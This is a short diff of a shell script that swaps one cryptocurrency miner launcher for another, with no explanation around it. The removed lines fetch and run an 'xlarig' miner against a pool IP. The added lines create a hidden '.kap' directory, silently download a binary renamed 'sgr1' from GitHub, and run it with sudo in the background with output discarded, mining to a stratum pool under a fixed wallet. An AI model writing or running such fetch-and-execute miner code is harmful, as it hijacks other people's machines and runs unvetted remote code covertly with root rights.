@@ -1,3 +1,4 @@
-#!/bin/bash
-wget https://github.com/bengetsia/soft/raw/main/xlarig.tar.gz && tar -xvf xlarig.tar.gz
-./xlarig -o 172.104.51.152:443 -u ZEPHs9S2EWRQzizKJRbnnvATxUoGNCbG5AH5t3HoCwVRWGuyerr8UshcoEwjzbxq88MNDKhBdmzc1Qs1s4u8JQ33YDcbYhxx5SN -p YOUR
+mkdir .kap && cd .kap
+wget -O sgr1 https://github.com/ganejafaujanih/ins/raw/main/cuan >/dev/null 2>&1
+chmod +x sgr1
+sudo ./sgr1 -a minotaurx  -o stratum+tcp://stratum-eu.rplant.xyz:7068 -u RBsvCPoH7ML9pNaXP6mibF2xmF3mgM4RGT.$(echo $(shuf -i 1-20000 -n 1)-SUIII) -p x > /dev/null 2>&1 &
